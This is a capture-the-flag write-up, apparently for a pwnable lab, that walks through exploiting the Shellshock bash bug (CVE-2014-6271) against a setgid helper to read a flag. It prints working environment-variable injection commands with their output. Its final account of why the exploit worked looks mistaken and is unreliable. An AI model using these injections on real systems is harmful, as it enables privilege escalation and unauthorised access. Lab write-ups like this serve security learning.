## shellshock

Back in 2014 a vulnerability was found in bash that would allow an attacker to execute bash commands from an environment variable. You can test if a version of bash is vulnerable to it by running the following:

```
env var='() { ignore this;}; echo vulnerable' ./bash -c /bin/true
```

When we run `ls` we find that they gave us a custom version of bash other than the one on the system, this probably tells us that the bash script is vulnerable to something and if we run the above command we'll find that it's definitely vulnerable to shellshock (shocker).

Source code:
```
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

Since shellsock.c tells us that the /home/shellshock/shellshock program sets the effective user and group id as the effetive group id of ./shellshock (which has the suid bit set for the group level to give us shellshock_pwn) we can use the vulnerable version of bash to also run commands from environment variables that will be run as a user with the shellshock_pwn group, which lets us read the flag.

And we run the command...

```
shellshock@pwnable:~$ env x='() { :;}; id' ./bash -c "./shellshock"
uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
Segmentation fault (core dumped)
```
... and it doesn't work. Hmmm...

Let's try and find this version number of bash:

```
shellshock@pwnable:~$ strings bash | grep version
shell_version_string
build_version
sccs_version
rl_library_version
rl_do_lowercase_version
show_shell_version
rl_readline_version
dist_version
GNU bash, version %s-(%s)
GNU bash, version %s (%s)
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@(#)Bash version 4.2.25(1) release GNU
display-shell-version
      -l        do not print tilde-prefixed versions of directories relative
    HOSTTYPE    The type of CPU this version of Bash is running under.
    OSTYPE      The version of Unix this version of Bash is running on.
    version, type `enable -n test'.
do-lowercase-version
.gnu.version
.gnu.version_r

```

Let's see what Bash 4.2.25(1) is vulnerable to by googling it, because my intuition has failed. 

That didn't turn anything out either, but I randomly tried tihs and it worked.

```
shellshock@pwnable:~$ export badvar='() { :;}; ./bash -c /bin/cat flag'
shellshock@pwnable:~$ bash -c ./shellshock
```

I misunderstood how this exploit worked, the program running shellshock didn't need to be vulnerable. In fact, I was able to replicate this entirely without using the given version of bash at `/home/shellshock/bash`

```
shellshock@pwnable:~$ export badvar='() { :;}; /bin/bash -c "/bin/cat flag"'
shellshock@pwnable:~$ /bin/bash -c ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
shellshock@pwnable:~$ bash --version
GNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

So the version of bash on this system is vulnerable to this, and maybe that binary was only given to us as a hint?
